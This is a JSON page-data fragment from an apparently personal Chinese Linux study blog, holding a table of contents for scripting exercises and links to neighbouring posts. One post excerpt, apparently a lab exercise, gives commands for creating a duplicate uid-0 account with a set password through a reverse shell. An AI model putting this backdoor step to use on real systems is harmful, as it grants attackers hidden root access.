href=\"#6%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E9%87%8D%E8%A6%81-Why-it-Matters\"><span class=\"toc-text\">6、为什么重要 (Why it Matters)?</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E5%9C%BA%E6%99%AF%E6%A8%A1%E6%8B%9F\"><span class=\"toc-text\">二、场景模拟</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C\"><span class=\"toc-text\">三、实验</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%AE%A9%E4%B8%80%E5%8F%B0%E6%96%B0%E6%9C%BA%E5%AD%90%EF%BC%8C%E5%AE%8C%E6%88%90%E5%85%B3%E9%98%B2%E7%81%AB%E5%A2%99%EF%BC%8C%E5%85%B3%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1%EF%BC%8C%E6%8D%A2%E6%BA%90%EF%BC%8Cselinux%E7%9A%84%E6%93%8D%E4%BD%9C-%E7%8B%AC%E7%AB%8B%E5%AE%8C%E6%88%90\"><span class=\"toc-text\">1、写一个自动化脚本，让一台新机子，完成关防火墙，关虚拟网卡，换源，selinux的操作  独立完成</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%87%AA%E5%8A%A8%E8%AF%86%E5%88%ABfirefox%E5%90%AF%E5%8A%A8%E7%9A%84pid%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%85%B3%E9%97%ADfirefox%EF%BC%88%E6%9C%80%E5%A5%BD%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E8%A7%A3%E5%86%B3%EF%BC%89\"><span class=\"toc-text\">2、写一个自动化脚本，自动识别firefox启动的pid，并且关闭firefox（最好一条命令解决）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BE%93%E5%87%BA%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0%E5%92%8Cip%E5%9C%B0%E5%9D%80\"><span class=\"toc-text\">3、写一个自动化脚本，输出网卡名称和ip地址</span></a></li></ol></li></ol></li></ol>","author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Linux基础综合练习2","uid":"787fb5eaa60e82359b7afd58d35677cd","slug":"Linux基础综合练习2","date":"2025-08-08T06:13:15.000Z","updated":"2025-08-08T10:13:27.679Z","comments":true,"path":"api/articles/Linux基础综合练习2.json","keywords":null,"cover":[],"text":"1、使用反弹的shell创建uid为0的账户，非交互设置密码12useradd -o -u 0 testecho \"test:wyf153135\" | chpa...","permalink":"/post/Linux基础综合练习2","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":15,"path":"api/tags/Linux.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"网络管理","uid":"211ca85a2e196056b84f487853fdec80","slug":"网络管理","date":"2025-08-07T02:21:43.000Z","updated":"2025-08-07T09:37:38.759Z","comments":true,"path":"api/articles/网络管理.json","keywords":null,"cover":[],"text":"网络管理一、基本概念1、物理网卡（NIC, Network Interface Card）​ 硬件实体：插在主板或扩展槽上的设备（如 Intel千兆网卡、Rea...","permalink":"/post/网络管理","photos":[],"count_time":{"symbolsCount":"18k","symbolsTime":"16 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":15,"path":"api/tags/Linux.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}